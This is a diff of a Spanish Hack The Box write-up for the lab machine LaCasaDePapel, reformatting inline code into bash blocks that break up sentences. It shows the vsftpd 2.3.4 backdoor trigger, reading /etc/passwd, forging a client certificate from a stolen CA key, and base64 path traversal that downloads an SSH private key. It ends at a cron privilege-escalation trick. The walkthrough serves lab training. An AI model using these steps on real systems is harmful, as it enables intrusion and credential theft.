@@ -51,7 +51,15 @@ nmap -sC -sV -p21,22,80,443 10.10.10.131 -oN targeted
 | 443    | https    | Web Fuzzing                 |            |
 
 
-Ya aqui podemos ver en el commonName del certificado ssl `lacasadepapel.htb` que añadimos al `/etc/hosts`
+Ya aqui podemos ver en el commonName del certificado ssl 
+```bash
+ lacasadepapel.htb 
+```
+ que añadimos al 
+```bash
+ /etc/hosts 
+```
+
 
 ### Coneccion Anonoymous con ftp {-}
 
@@ -85,15 +93,31 @@ No vemos nada interesante aqui.
 
 #### Checkear la web {-}
 
-Si entramos en la url `http://10.10.10.131`, El wappalizer no nos muestra nada. Si entramos con el dominio `http://lacasadepapel.htb` vemos lo mismo.
-Intentamos por **https** `https://lacasadepapel.htb` y aqui la cosa cambia. Tenemos un mensaje que dice que tenemos que proporcionar un certificado cliente
+Si entramos en la url 
+```bash
+ http://10.10.10.131 
+```
+, El wappalizer no nos muestra nada. Si entramos con el dominio 
+```bash
+ http://lacasadepapel.htb 
+```
+ vemos lo mismo.
+Intentamos por **https** 
+```bash
+ https://lacasadepapel.htb 
+```
+ y aqui la cosa cambia. Tenemos un mensaje que dice que tenemos que proporcionar un certificado cliente
 para ver mas cosas. Pero aqui necessitamos tener mas informaciones.
 ## Vulnerability Assessment {-}
 
 ### vsftpd 2.3.4 {-}
 
 Como ya sabemos que esta version es vulnerable, buscando por internet o analyzando el exploit de Metasploit vemos que la vulnerabilidad
-reside en poner una sonrisita `:)` al final del nombre de usuario y esto hace que se habre el puerto 6200 de la maquina.
+reside en poner una sonrisita 
+```bash
+ :) 
+```
+ al final del nombre de usuario y esto hace que se habre el puerto 6200 de la maquina.
 
 ```bash
 nc 10.10.10.131 6200
@@ -161,14 +185,34 @@ class Tokyo {
 }
 ```
 
-Aqui vemos la class Tokyo con su funccion private. Podemos ver que en el directorio `/home/nairobi/ca.key` hay una key. Como este servicio
-esta en php, miramos si podemos listar contenido de ficheros con las fucciones php `file_get_contents()`, `scandir()` o `readfile()`
+Aqui vemos la class Tokyo con su funccion private. Podemos ver que en el directorio 
+```bash
+ /home/nairobi/ca.key 
+```
+ hay una key. Como este servicio
+esta en php, miramos si podemos listar contenido de ficheros con las fucciones php 
+```bash
+ file_get_contents() 
+```
+, 
+```bash
+ scandir() 
+```
+ o 
+```bash
+ readfile() 
+```
+
 
 ```bash
 file_get_contents("/etc/passwd")
 ```
 
-Y podemos ver el `/etc/passwd`, miramos si podemos ver la key del usuario nairobi.
+Y podemos ver el 
+```bash
+ /etc/passwd 
+```
+, miramos si podemos ver la key del usuario nairobi.
 
 miramos si encontramos id_rsa
 
@@ -224,7 +268,11 @@ Ahora que tenemos la key podemos crear un certificado de cliente valido.
     openssl x509 -req -in client.req -set_serial 123 -CA ca.cer -CAkey ca.key -days 365 -extensions client -outform PEM -out client.cer
     ```
 
-    Aqui ya tenemos un certificado cliente valido. Pero ahora tenemos que convertirlo en un `.p12` para que los navegadores los accepten.
+    Aqui ya tenemos un certificado cliente valido. Pero ahora tenemos que convertirlo en un 
+```bash
+ .p12 
+```
+ para que los navegadores los accepten.
 
 1. Conversion en certificado pkcs12 para navegadores
 
@@ -234,14 +282,46 @@ Ahora que tenemos la key podemos crear un certificado de cliente valido.
     ```
 
 
-Aqui ya podemos añadir a firefox el certificado firmado. En firefox vamos a `ajustes` y buscamos por `cert`. Damos a `Ver certificado` y en el menu `Sus certificados`
-le podemos dar a `importar`. Importamos el `client.p12` y le damos a acceptar. 
+Aqui ya podemos añadir a firefox el certificado firmado. En firefox vamos a 
+```bash
+ ajustes 
+```
+ y buscamos por 
+```bash
+ cert 
+```
+. Damos a 
+```bash
+ Ver certificado 
+```
+ y en el menu 
+```bash
+ Sus certificados 
+```
 
-Si recargamos la pagina `https://lacasadepapel.htb` y acceptamos el certificado, ya podemos ver que el contenido a cambiado y un private arena es visible.
+le podemos dar a 
+```bash
+ importar 
+```
+. Importamos el 
+```bash
+ client.p12 
+```
+ y le damos a acceptar. 
+
+Si recargamos la pagina 
+```bash
+ https://lacasadepapel.htb 
+```
+ y acceptamos el certificado, ya podemos ver que el contenido a cambiado y un private arena es visible.
 
 ### Pathtraversal con base64 {-}
 
-Aqui vemos dos Seasons y si le damos a una vemos unos ficheros `.avi` y haciendo hovering bemos que los nombres son en base64. Lo comprobamos con un fichero.
+Aqui vemos dos Seasons y si le damos a una vemos unos ficheros 
+```bash
+ .avi 
+```
+ y haciendo hovering bemos que los nombres son en base64. Lo comprobamos con un fichero.
 
 ```bash
 echo 'U0VBU09OLTEvMDMuYXZp' | base64 -d;echo
@@ -249,8 +329,20 @@ echo 'U0VBU09OLTEvMDMuYXZp' | base64 -d;echo
 SEASON-1/03.avi
 ```
 
-En la url vemos que tenemos algo como `https://lacasadepapel.htb/?path=SEASON-1`. Miramos lo que pasa si le damos a `https://lacasadepapel.htb/?path=/etc/passwd` y
-salta un error como no existe el path en `/home/berlin/download//etc/passwd` y que usa la funccion scandir para esto. Ya pensamos en un path traversal, pero como es
+En la url vemos que tenemos algo como 
+```bash
+ https://lacasadepapel.htb/?path=SEASON-1 
+```
+. Miramos lo que pasa si le damos a 
+```bash
+ https://lacasadepapel.htb/?path=/etc/passwd 
+```
+ y
+salta un error como no existe el path en 
+```bash
+ /home/berlin/download//etc/passwd 
+```
+ y que usa la funccion scandir para esto. Ya pensamos en un path traversal, pero como es
 un scandir solo podemos ir a por directorios.
 
 ```bash
@@ -265,10 +357,26 @@ echo -n '../user.txt' | base64
 Li4vdXNlci50eHQ=
 ```
 
-y si vamos ahora a la url `https://lacasadepapel.htb/file/Li4vdXNlci50eHQ=` vemos que podemos descargar el user.txt. Pero a nosotros nos interessa ganar accesso
+y si vamos ahora a la url 
+```bash
+ https://lacasadepapel.htb/file/Li4vdXNlci50eHQ= 
+```
+ vemos que podemos descargar el user.txt. Pero a nosotros nos interessa ganar accesso
 al systema.
 
-En la url `https://lacasadepapel.htb/?path=../` vemos que podemos pinchar al directorio `.ssh` y a dentro hay una `id_rsa`. Hacemos lo mismos que con el user.txt
+En la url 
+```bash
+ https://lacasadepapel.htb/?path=../ 
+```
+ vemos que podemos pinchar al directorio 
+```bash
+ .ssh 
+```
+ y a dentro hay una 
+```bash
+ id_rsa 
+```
+. Hacemos lo mismos que con el user.txt
 
 ## Vuln exploit & Gaining Access {-}
 
@@ -280,7 +388,11 @@ echo -n '../.ssh/id_rsa' | base64
 Li4vLnNzaC9pZF9yc2E=
 ```
 
-y con la url `https://lacasadepapel.htb/file/Li4vLnNzaC9pZF9yc2E=` descargamos el fichero id_rsa.
+y con la url 
+```bash
+ https://lacasadepapel.htb/file/Li4vLnNzaC9pZF9yc2E= 
+```
+ descargamos el fichero id_rsa.
 
 ```bash
 mv /home/s4vitar/Descargas/firefox/id_rsa .
@@ -344,9 +456,25 @@ chmod +x pspy
 ./pspy
 ```
 
-Podemos ver que hay una tarea ejecutada por root que lanza un `sudo -u nobody /usr/bin/node /home/professor/memcached.js` 
+Podemos ver que hay una tarea ejecutada por root que lanza un 
+```bash
+ sudo -u nobody /usr/bin/node /home/professor/memcached.js 
+```
+ 
 
-Si vamos al `/home/professor` vemos el fichero `memcached.js` pero no nos deja ver lo que hay dentro. Hay otro fichero `memcached.ini` que contiene
+Si vamos al 
+```bash
+ /home/professor 
+```
+ vemos el fichero 
+```bash
+ memcached.js 
+```
+ pero no nos deja ver lo que hay dentro. Hay otro fichero 
+```bash
+ memcached.ini 
+```
+ que contiene
 el comando ejecutado durante la tarea cron. 
 
 Aqui el truco es que aun que el fichero no se puedo modificar, como esta en nuestra carpeta HOME, lo podemos borrar.
